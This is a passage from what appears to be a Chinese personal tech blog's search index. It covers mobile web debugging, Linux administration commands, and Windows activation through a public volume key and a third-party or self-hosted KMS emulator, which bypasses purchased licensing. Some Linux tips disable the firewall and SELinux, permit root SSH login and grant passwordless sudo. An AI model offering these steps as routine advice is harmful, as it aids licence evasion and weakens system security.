","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/:2:5","series":null,"tags":["blog","macos"],"title":"macos问题处理","uri":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/#启用-root"},{"categories":["blog"],"content":" 调试安卓或者 iphone 上的网页 开发的时候，电脑上 chrome 没问题，但是手机上访问有问题，那么就需要在手机上调试。 iphone 上调试 safari 开启 safari 上的 web 检查器 连接 mac，然后打开开发者选项 mac 上选中自己 iphone 即可开始调试 android 上调试 chrome brew cask install android-file-transfer 可以帮助你检测到手机 打开手机上的开发者选项，开启 usb 调试 chrome://inspect/#devices 就可以查看到设备，然后点开 手机上访问页面，就可以通过 devtools 调试了 ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/:2:6","series":null,"tags":["blog","macos"],"title":"macos问题处理","uri":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/#调试安卓或者-iphone-上的网页"},{"categories":["blog"],"content":" 调试安卓或者 iphone 上的网页 开发的时候，电脑上 chrome 没问题，但是手机上访问有问题，那么就需要在手机上调试。 iphone 上调试 safari 开启 safari 上的 web 检查器 连接 mac，然后打开开发者选项 mac 上选中自己 iphone 即可开始调试 android 上调试 chrome brew cask install android-file-transfer 可以帮助你检测到手机 打开手机上的开发者选项，开启 usb 调试 chrome://inspect/#devices 就可以查看到设备，然后点开 手机上访问页面，就可以通过 devtools 调试了 ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/:2:6","series":null,"tags":["blog","macos"],"title":"macos问题处理","uri":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/#iphone-上调试-safari"},{"categories":["blog"],"content":" 调试安卓或者 iphone 上的网页 开发的时候，电脑上 chrome 没问题，但是手机上访问有问题，那么就需要在手机上调试。 iphone 上调试 safari 开启 safari 上的 web 检查器 连接 mac，然后打开开发者选项 mac 上选中自己 iphone 即可开始调试 android 上调试 chrome brew cask install android-file-transfer 可以帮助你检测到手机 打开手机上的开发者选项，开启 usb 调试 chrome://inspect/#devices 就可以查看到设备，然后点开 手机上访问页面，就可以通过 devtools 调试了 ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/:2:6","series":null,"tags":["blog","macos"],"title":"macos问题处理","uri":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/#android-上调试-chrome"},{"categories":["point"],"content":"python 是一门非常流行的编程语言. 要点: 生态强大, 特别在 ai 方便 解释执行, 强类型 ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/python/:0:0","series":null,"tags":["point","python"],"title":"python","uri":"/posts/%E7%AC%94%E8%AE%B0/point/python/#"},{"categories":["blog"],"content":"推荐使用正版, 但用来学技术也是不错的.","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%B3%BB%E7%BB%9F%E6%BF%80%E6%B4%BB/","series":null,"tags":["blog","windows"],"title":"windows系统激活","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%B3%BB%E7%BB%9F%E6%BF%80%E6%B4%BB/"},{"categories":["blog"],"content":" 简介推荐使用正版, 但用来学技术也是不错的. windows 的系统激活方式有以下几种: MSDN 密钥。属于内部的使用，封不封看微软态度。 Retail 零售版密钥。就是你找微软买的，缺点就是要钱呗。 OEM 密钥。电脑厂家出厂预装的系统，然后绑定了你的硬件信息，无法跨机器使用。 VOL 密钥。一般是企业或者学校购买了批量授权。应该分 mak 和 kms 两种，前者永久，后者 180 天需激活一次。 ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%B3%BB%E7%BB%9F%E6%BF%80%E6%B4%BB/:1:0","series":null,"tags":["blog","windows"],"title":"windows系统激活","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%B3%BB%E7%BB%9F%E6%BF%80%E6%B4%BB/#简介"},{"categories":["blog"],"content":" 操作步骤 如果是新安装的系统，没有 cd-key 输入过，可以直接跳过前面 2 步 #执行,弹出(已成功卸载了产品密钥) slmgr.vbs /upk #执行,弹出(成功的安装了产品密钥) slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX #执行,弹出(密钥管理服务计算机名成功的设置(kms.luody.info) slmgr /skms kms.luody.info #执行,弹出(成功的激活了产品) slmgr /ato ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%B3%BB%E7%BB%9F%E6%BF%80%E6%B4%BB/:2:0","series":null,"tags":["blog","windows"],"title":"windows系统激活","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%B3%BB%E7%BB%9F%E6%BF%80%E6%B4%BB/#操作步骤"},{"categories":["blog"],"content":" 自己搭建 docker run -d -p 1688:1688 --name kms --restart=always teddysun/kms # 验证 # 查看服务的版本信息 vlmcs.exe -v kms.luody.info # 查看支持的服务类型 vlmcs.exe -x kms.luody.info 附件/vlmcs.exe Dockerfile 在这里: across/docker/kms/Dockerfile at master · teddysun/across · GitHub 实现在这里: GitHub - Wind4/vlmcsd: KMS Emulator in C (currently runs on Linux including Android, FreeBSD, Solaris, Minix, Mac OS, iOS, Windows with or without Cygwin) ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%B3%BB%E7%BB%9F%E6%BF%80%E6%B4%BB/:3:0","series":null,"tags":["blog","windows"],"title":"windows系统激活","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%B3%BB%E7%BB%9F%E6%BF%80%E6%B4%BB/#自己搭建"},{"categories":["blog"],"content":" 可能遇到的问题","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%B3%BB%E7%BB%9F%E6%BF%80%E6%B4%BB/:4:0","series":null,"tags":["blog","windows"],"title":"windows系统激活","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%B3%BB%E7%BB%9F%E6%BF%80%E6%B4%BB/#可能遇到的问题"},{"categories":["blog"],"content":" 弹出内部版本 xx 过期我用的是 win10 预览版，一直没有激活。激活了以后，一直弹出内部版本过期。 进入系统更新，升级到最新的版本，之后重启解决 ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%B3%BB%E7%BB%9F%E6%BF%80%E6%B4%BB/:4:1","series":null,"tags":["blog","windows"],"title":"windows系统激活","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%B3%BB%E7%BB%9F%E6%BF%80%E6%B4%BB/#弹出内部版本-xx-过期"},{"categories":["point"],"content":"CommonMark 是一种 markdown 的语法规范.因为有很多人的认同, 事实上已经是 markdown 的标准化组织. CommonMark 要点: 各大编程语言都有支持 各种公司的 markdown 拓展都以此为基础 ","date":"2023-06-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/commonmark/:0:0","series":null,"tags":["point","CommonMark"],"title":"CommonMark","uri":"/posts/%E7%AC%94%E8%AE%B0/point/commonmark/#"},{"categories":["point"],"content":"linux 是一个开源的系统. 有很多的发行版, 例如 centos, ubuntu. 要点: 免费 服务器默认系统 社区庞大 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/linux/:0:0","series":null,"tags":["point","linux"],"title":"linux","uri":"/posts/%E7%AC%94%E8%AE%B0/point/linux/#"},{"categories":["blog"],"content":"这里记录 [[笔记/point/linux|linux]] 的命令与配置, 通常都是某种情况下的处理方法.","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":" 简介这里记录 linux 的命令与配置, 通常都是某种情况下的处理方法. ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:1:0","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#简介"},{"categories":["blog"],"content":" 常见依赖","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#常见依赖"},{"categories":["blog"],"content":" c/c++ 项目依赖 # 安装编译需要用的依赖 apt install libpcre3 libpcre3-dev openssl libssl-dev build-essential cmake -y ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:2:1","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#cc-项目依赖"},{"categories":["blog"],"content":" 常用配置","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:0","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#常用配置"},{"categories":["blog"],"content":" 免密 sudo vim /etc/sudoers # 找到下面这部分内容 # Allow members of group sudo to execute any command %sudo ALL=(ALL:ALL) ALL kentxxq ALL=(ALL) NOPASSWD: ALL # 加入此行 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:1","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#免密-sudo"},{"categories":["blog"],"content":" 安装 deb/chrome wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb apt install ./google-chrome-stable_current_amd64.deb google-chrome -v ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:2","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#安装-debchrome"},{"categories":["blog"],"content":" 挂载磁盘已知新盘 (有数据) 的分区类型, # fdisk -l # Disk /dev/vdb 是硬盘 # Device /dev/vdb1 是分区 # mount挂载的是分区 mount -t exfat /dev/vdb1 /mnt/exfat 新盘 (无数据): # 创建一个目录,后续把新盘挂载到这里 mkdir -p /data/new-data # 查看并发现新磁盘 /dev/sdb fdisk -l # 进行格式化, y继续.会变成一个分区 mkfs -t ext4 /dev/sdb # 查看格式化后的磁盘, 记录UUID blkid # 追加UUID, 按照对应的格式加入到 /etc/fstab echo 'UUID=你的UUID /data/new-data ext4 defaults 0 0' # 生效 mount -a 如果是阿里云, 参考 笔记/阿里云操作#新加硬盘 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:3","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#挂载磁盘"},{"categories":["blog"],"content":" 环境变量 # export 会话生效,或者加入到 ~/.bashrc 中 PATH=~/opt/bin:$PATH # 或者 PATH=$PATH:~/opt/bin ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:4","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#环境变量"},{"categories":["blog"],"content":" alias 补全 # 通常已经安装了 # apt install bash-completion -y # 下载文件 curl https://raw.githubusercontent.com/cykerway/complete-alias/master/complete_alias -o ~/.complete_alias # 编辑配置文件 vim /root/.bash_completion . /root/.complete_alias # 设置alias vim ~/.bashrc alias sc='systemctl' # 尾部添加 vim /root/.complete_alias complete -F _complete_alias sc # 如果.bashrc文件没有启用.必须退出,重新登录后生效! # 默认是注释的 # enable programmable completion features (you don't need to enable # this, if it's already enabled in /etc/bash.bashrc and /etc/profile # sources /etc/bash.bashrc). #if [ -f /etc/bash_completion ] \u0026\u0026 ! shopt -oq posix; then # . /etc/bash_completion #fi 常用配置 # 查看日志 alias tailf='tail -f' # 查看出口ip alias myip = 'curl -L test.kentxxq.com/ip' # 全部代理配置 alias vpn='export all_proxy=http://1.1.1.1:7890;' # 清空 alias novpn='unset all_proxy;' # 当前会话代理 alias vpn='export http_proxy=http://1.1.1.1:7890; export https_proxy=http://1.1.1.1:7890;' # 带密码代理 alias vpn='export http_proxy=http://user1:pass1@1.1.1.1:7890; export https_proxy=http://user1:pass1@1.1.1.1:7890;' # 清空 alias novpn='unset http_proxy; unset https_proxy;' # 查看自己的ip alias myip='curl -k -L test.kentxxq.com/ip' ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:5","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#alias"},{"categories":["blog"],"content":" alias 补全 # 通常已经安装了 # apt install bash-completion -y # 下载文件 curl https://raw.githubusercontent.com/cykerway/complete-alias/master/complete_alias -o ~/.complete_alias # 编辑配置文件 vim /root/.bash_completion . /root/.complete_alias # 设置alias vim ~/.bashrc alias sc='systemctl' # 尾部添加 vim /root/.complete_alias complete -F _complete_alias sc # 如果.bashrc文件没有启用.必须退出,重新登录后生效! # 默认是注释的 # enable programmable completion features (you don't need to enable # this, if it's already enabled in /etc/bash.bashrc and /etc/profile # sources /etc/bash.bashrc). #if [ -f /etc/bash_completion ] \u0026\u0026 ! shopt -oq posix; then # . /etc/bash_completion #fi 常用配置 # 查看日志 alias tailf='tail -f' # 查看出口ip alias myip = 'curl -L test.kentxxq.com/ip' # 全部代理配置 alias vpn='export all_proxy=http://1.1.1.1:7890;' # 清空 alias novpn='unset all_proxy;' # 当前会话代理 alias vpn='export http_proxy=http://1.1.1.1:7890; export https_proxy=http://1.1.1.1:7890;' # 带密码代理 alias vpn='export http_proxy=http://user1:pass1@1.1.1.1:7890; export https_proxy=http://user1:pass1@1.1.1.1:7890;' # 清空 alias novpn='unset http_proxy; unset https_proxy;' # 查看自己的ip alias myip='curl -k -L test.kentxxq.com/ip' ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:5","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#补全"},{"categories":["blog"],"content":" alias 补全 # 通常已经安装了 # apt install bash-completion -y # 下载文件 curl https://raw.githubusercontent.com/cykerway/complete-alias/master/complete_alias -o ~/.complete_alias # 编辑配置文件 vim /root/.bash_completion . /root/.complete_alias # 设置alias vim ~/.bashrc alias sc='systemctl' # 尾部添加 vim /root/.complete_alias complete -F _complete_alias sc # 如果.bashrc文件没有启用.必须退出,重新登录后生效! # 默认是注释的 # enable programmable completion features (you don't need to enable # this, if it's already enabled in /etc/bash.bashrc and /etc/profile # sources /etc/bash.bashrc). #if [ -f /etc/bash_completion ] \u0026\u0026 ! shopt -oq posix; then # . /etc/bash_completion #fi 常用配置 # 查看日志 alias tailf='tail -f' # 查看出口ip alias myip = 'curl -L test.kentxxq.com/ip' # 全部代理配置 alias vpn='export all_proxy=http://1.1.1.1:7890;' # 清空 alias novpn='unset all_proxy;' # 当前会话代理 alias vpn='export http_proxy=http://1.1.1.1:7890; export https_proxy=http://1.1.1.1:7890;' # 带密码代理 alias vpn='export http_proxy=http://user1:pass1@1.1.1.1:7890; export https_proxy=http://user1:pass1@1.1.1.1:7890;' # 清空 alias novpn='unset http_proxy; unset https_proxy;' # 查看自己的ip alias myip='curl -k -L test.kentxxq.com/ip' ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:5","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#常用配置-1"},{"categories":["blog"],"content":" 免密 ssh # 生成公钥和秘钥 ssh-keygen -t rsa # 拷贝公钥到远程机器,需要输入密码 ssh-copy-id root@1.1.1.1 # 手动拷贝 # 把 /root/.ssh/id_rsa.pub 放到目标机器的 /root/.ssh/authorized_keys 里 # 测试效果 ssh root@1.1.1.1 # 测试效果，ssh远程执行命令 ssh root@1.1.1.1 \"ls\" # 如果目标ip重装过,需要c清理本地的拷贝记录 ssh-keygen -R 1.1.1.1 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:6","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#免密-ssh"},{"categories":["blog"],"content":" 允许 root 远程登录 vim /etc/ssh/sshd_config # 把参数值改成yes PermitRootLogin yes # 设置密码 passwd root # 重启ssh服务 systemctl restart ssh ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:7","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#允许-root-远程登录"},{"categories":["blog"],"content":" 禁用密码登录/密钥登录 vim /etc/ssh/sshd_config # 禁用密码登录 PasswordAuthentication no # 把公钥加入到认证文件中 cat id_rsa.pub \u003e\u003e /root/.ssh/authorized_keys # 配置一下这个文件的权限，保证安全 chmod 644 ~/.ssh/authorized_keys # 重启ssh服务 systemctl restart ssh ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:8","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#禁用密码登录密钥登录"},{"categories":["blog"],"content":" 安装字体一般来说合同都要使用宋体, simsun # 创建字体文件夹，放入字体文件 mkdir -p /usr/share/fonts/simsun cd /usr/share/fonts/simsun rz sumsun.ttc # 安装字体工具 apt install xfonts-utils fontconfig -y # 字体操作 mkfontscale mkfontdir # 刷新缓存 fc-cache –fv # 字体查询 fc-list :lang=zh ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:9","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#安装字体"},{"categories":["blog"],"content":" 挂载 windows 共享盘 mount -t cifs -o username=Administrator,password=密码 //共享机器的ip地址/data /mnt/pythondata # 另一个示例 mkdir /mnt/win mount -t cifs -o username=\"Everyone\" //192.168.2.100/vm_share /mnt/win ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:10","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#挂载-windows-共享盘"},{"categories":["blog"],"content":" 配置 limit # 先确保/etc/security/limits.d没有覆盖的配置 vim /etc/security/limits.conf # hard硬限制 不会超过 # soft软限制 告警 # nofile 每个进程可以打开的文件数 root soft nofile 65535 root hard nofile 65535 * soft nofile 65535 * hard nofile 65535 # nproc 操作系统级别对每个用户创建的进程数 root soft nproc 65535 root hard nproc 65535 * soft nproc 65535 * hard nproc 65535 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:11","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#配置-limit"},{"categories":["blog"],"content":" 温度传感器 apt install lm-sensors # 观察模式 watch sensors # 如果不是ubuntu系统 cat /sys/class/thermal/thermal_zone0/temp # 摄氏度 echo $[$(cat /sys/class/thermal/thermal_zone0/temp)/1000]° ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:12","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#温度传感器"},{"categories":["blog"],"content":" 安装 snap-store sudo snap install snap-store ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:13","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#安装-snap-store"},{"categories":["blog"],"content":" wifi 工具 sudo apt install wireless-tools # 查看wifi设备信息 iwconfig ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:14","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#wifi-工具"},{"categories":["blog"],"content":" 关闭防火墙 ufw disable ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:15","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#关闭防火墙"},{"categories":["blog"],"content":" 安装桌面 # 安装一个小工具 sudo apt install tasksel # 看可以装哪些版本 tasksel --list-tasks # 安装桌面套件 sudo tasksel install ubuntu-desktop # 重启生效 reboot ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:16","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#安装桌面"},{"categories":["blog"],"content":" 关闭 selinux apt install selinux-utils policycoreutils -y # 当前生效 setenforce 0 # 永久生效 vim /etc/selinux/config SELINUX=disabled ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:17","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#关闭-selinux"},{"categories":["blog"],"content":" 定时任务 crontab 推荐使用系统配置文件 /etc/crontab 文档不建议使用 /etc/cron.d 系统配置目录, 这个目录留给应用程序放自己的配置. 例如安装 mysql 后, 程序自带一个定时备份. crontab -e 等命令都是操作 /var/spool/cron/crontabs/用户名 重要!!! 1 和 2 属于系统级别配置文件, 允许指定用户名字段 3 属于用户级别配置文件, 用户名字段会是命令的一部分, 导致报错!!! vim /etc/crontab # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed # 凌晨5点和6点的时候,每10分钟执行 */10 5,6 * * * root /bin/bash /root/backup.sh 特定值：使用具体的数值表示，如 5 表示第 5 分钟、10 表示 10 点。 通配符（*）：表示匹配任意值，如 * 表示每分钟、每小时、每天等。 范围值：使用 - 表示范围，如 2-5 表示 2 到 5 之间的值。 枚举值：使用逗号 , 表示枚举多个值，如 1,3,5 表示 1、3 和 5。 步长值：使用 */n 表示步长，如 */15 表示每隔 15 个单位执行一次。 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:18","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#定时任务-crontab"},{"categories":["blog"],"content":" openssl 验证问题在部署服务的时候, 发现无法发送邮件. 因为 ssl 验证不通过, 可以尝试配置. openssl_conf = openssl_init [openssl_init] ssl_conf = ssl_config [ssl_config] system_default = tls_defaults [tls_defaults] CipherString = @SECLEVEL=2:kEECDH:kRSA:kEDH:kPSK:kDHEPSK:kECDHEPSK:-aDSS:-3DES:!DES:!RC4:!RC2:!IDEA:-SEED:!eNULL:!aNULL:!MD5:-SHA384:-CAMELLIA:-ARIA:-AESCCM8 Ciphersuites = TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:TLS_AES_128_CCM_SHA256 MinProtocol = TLSv1.2 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:19","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#openssl-验证问题"},{"categories":["blog"],"content":" 时间同步 NTP 源 阿里NTP 腾讯NTP pool.ntp.org公益组织 微软 NTP time.windows.com 谷歌NTP Cloudflare-NTP 时区 # 查看当前时间和配置 timedatectl # 查询可用的时区 timedatectl list-timezones | grep -i shang # 设置时区 timedatectl set-timezone Asia/Shanghai chrony - 主机环境chrony 在各方面有优势，但是依赖 chronyd 守护进程，chronyc 只是一个客户端。所以不适用于容器 # 通常自带chrony apt install chrony -y # 查看当前的源 # ^* 当前使用 ^+ 备用 ^? 不可用 chronyc sources -v # 查看当前状态 chronyc tracking # 手动同步时间 chronyc makestep # 写入RTC硬件时间。如果开启chronyd守护进程会11分钟自动同步一次，但是手动操作的话建议还是主动同步一下 hwclock -w # systemd管理自动同步，通常自带 systemctl enable chrony --now 如果没有源，vim /etc/chrony/chrony.conf 参考下面 # 配置不同的源 server ntp.cloud.aliyuncs.com minpoll 4 maxpoll 10 iburst server ntp.aliyun.com minpoll 4 maxpoll 10 iburst # Ignore stratum in source selection. stratumweight 0.05 # Record the rate at which the system clock gains/losses time. driftfile /var/lib/chrony/drift # Enable kernel RTC synchronization. rtcsync # In first three updates step the system clock instead of slew # if the adjustment is larger than 10 seconds. makestep 10 3 # Allow NTP client access from local network. #allow 192.168/16 # Listen for commands only on localhost. bindcmdaddress 127.0.0.1 bindcmdaddress ::1 # Disable logging of client accesses. noclientlog # Send a message to syslog if a clock adjustment is larger than 0.5 seconds. logchange 0.5 logdir /var/log/chrony #log measurements statistics tracking ntp - 原始/容器ntp 版本： apt install ntp ntpdate -y # 同步时间 ntpdate ntp.aliyun.com 0 * * * * 